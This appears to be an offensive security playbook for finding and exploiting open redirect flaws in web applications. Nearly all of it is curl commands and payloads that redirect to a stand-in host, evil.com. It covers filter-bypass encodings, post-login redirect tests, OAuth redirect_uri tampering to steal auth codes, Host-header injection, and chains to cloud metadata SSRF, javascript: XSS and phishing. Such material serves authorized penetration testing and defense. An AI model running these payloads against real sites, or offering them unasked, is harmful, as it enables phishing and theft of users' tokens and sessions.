# Playbook: Open Redirect Testing

## Purpose
Detect and exploit open redirect vulnerabilities for phishing, OAuth token
theft, and SSRF chaining. Covers parameter-based, header-based, and
meta/JS-based redirects.
Input: URL list with redirect parameters, or target domain.

---

## Step 1 — Identify Redirect Parameters

```bash
# From parameter discovery and wayback output
grep -iE "[?&](url|redirect|next|return|dest|destination|path|forward|to|goto|target|redir|returnUrl|return_url|continue|ref|callback|success|cancel|landing|out|link|navigate|go|RetURL|returl|site|uri|endpoint)=" \
  urls_all.txt | sort -u > redirect_candidates.txt

echo "Redirect candidates: $(wc -l < redirect_candidates.txt)"

# Also check HTTP headers that may trigger redirect:
# - Host header
# - X-Forwarded-Host
# - X-Original-URL
```

---

## Step 2 — Basic Open Redirect Test

```bash
ENDPOINT="https://TARGET/login?next="
EVIL="https://evil.com"

# Test 1 — Direct external URL
curl -sk -o /dev/null -D- "${ENDPOINT}${EVIL}" | grep -i "location"

# Test 2 — Protocol-relative
curl -sk -o /dev/null -D- "${ENDPOINT}//evil.com" | grep -i "location"

# Test 3 — Without protocol
curl -sk -o /dev/null -D- "${ENDPOINT}evil.com" | grep -i "location"

# Check for:
# - HTTP 301/302/303/307/308 with Location: pointing to evil.com
# - Meta refresh redirect
# - JavaScript redirect (location.href, location.assign, etc.)
```

---

## Step 3 — Filter Bypass Techniques

```bash
ENDPOINT="https://TARGET/redirect?url="

# URL encoding
curl -sk -D- "${ENDPOINT}https%3A%2F%2Fevil.com" | grep -i location

# Double encoding
curl -sk -D- "${ENDPOINT}https%253A%252F%252Fevil.com" | grep -i location

# Using @ for authority confusion
curl -sk -D- "${ENDPOINT}https://TARGET@evil.com" | grep -i location

# Using backslash
curl -sk -D- "${ENDPOINT}https://evil.com\@TARGET" | grep -i location
curl -sk -D- "${ENDPOINT}//evil.com\@TARGET" | grep -i location

# Domain with target as subdomain
curl -sk -D- "${ENDPOINT}https://TARGET.evil.com" | grep -i location

# Tab/newline injection
curl -sk -D- "${ENDPOINT}https://evil%09.com" | grep -i location
curl -sk -D- "${ENDPOINT}https://evil%0a.com" | grep -i location

# Fragment trick
curl -sk -D- "${ENDPOINT}https://evil.com#TARGET" | grep -i location
curl -sk -D- "${ENDPOINT}https://evil.com?.TARGET" | grep -i location

# Path-based tricks
curl -sk -D- "${ENDPOINT}/\\evil.com" | grep -i location
curl -sk -D- "${ENDPOINT}////evil.com" | grep -i location
curl -sk -D- "${ENDPOINT}/.evil.com" | grep -i location

# Data URI
curl -sk -D- "${ENDPOINT}data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=" | grep -i location

# JavaScript URI (if reflected in href)
curl -sk -D- "${ENDPOINT}javascript:alert(1)" | grep -i location
```

---

## Step 4 — Post-Authentication Redirect Test

```bash
# Login flows often redirect after successful auth
# The redirect target may be controllable

# Step 1: Start login with redirect parameter
curl -sk -D- -c /tmp/cookies.txt \
  "https://TARGET/login?returnUrl=https://evil.com"

# Step 2: Submit valid credentials
curl -sk -D- -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST "https://TARGET/login" \
  -d "username=testuser&password=testpass&returnUrl=https://evil.com" \
  | grep -i "location"

# If Location: https://evil.com after successful login
# → user's session cookie is sent to evil.com via Referer header
```

---

## Step 5 — OAuth/SSO Token Theft

```bash
# If target uses OAuth and has an open redirect:
# The auth code or token can be leaked via redirect

# Normal OAuth flow:
# https://auth.provider.com/authorize?
#   client_id=TARGET&
#   redirect_uri=https://TARGET/callback&
#   response_type=code

# Attack: modify redirect_uri to use open redirect
# https://auth.provider.com/authorize?
#   client_id=TARGET&
#   redirect_uri=https://TARGET/redirect?url=https://evil.com&
#   response_type=code

# If auth provider validates only the domain:
# Token/code leaks to evil.com via redirect chain

# Check redirect_uri validation strictness
REDIRECTS=(
  "https://TARGET/callback/../redirect?url=https://evil.com"
  "https://TARGET/callback?url=https://evil.com"
  "https://TARGET/callback#@evil.com"
)
```

---

## Step 6 — Header-Based Redirect

```bash
# Host header redirect
curl -sk -D- -H "Host: evil.com" "https://TARGET/" | grep -i location

# X-Forwarded-Host
curl -sk -D- -H "X-Forwarded-Host: evil.com" "https://TARGET/" | grep -i location

# X-Forwarded-For (some apps redirect based on geo)
curl -sk -D- -H "X-Forwarded-For: 1.2.3.4" "https://TARGET/" | grep -i location
```

---

## Step 7 — Chaining Open Redirect

```bash
# Open Redirect → SSRF
# If internal service trusts TARGET domain for URL fetching:
# Redirect through TARGET to reach internal services
# https://TARGET/redirect?url=http://169.254.169.254/

# Open Redirect → XSS
# javascript: URI in redirect parameter
# https://TARGET/redirect?url=javascript:alert(document.domain)

# Open Redirect → OAuth Token Theft
# See Step 5

# Open Redirect → Phishing
# https://TARGET/redirect?url=https://evil-login-page.com
# Victim sees TARGET domain in URL bar before redirect
```

---

## Output

```
ENDPOINT      : GET /login?RetURL=
PAYLOAD       : //evil.com
RESULT        : HTTP 302 → Location: //evil.com
SEVERITY      : MEDIUM (standalone) / HIGH (if chained with OAuth)
IMPACT        : Phishing — victim trusts TARGET domain
                OAuth token theft if redirect_uri is controllable
EVIDENCE      : [request/response + redirect chain]
```

---

## Tools Reference

```bash
# OpenRedireX
python3 openredirex.py -l urls.txt -p payloads.txt

# Oralyzer
python3 oralyzer.py -u "https://TARGET/login?next=FUZZ"
```
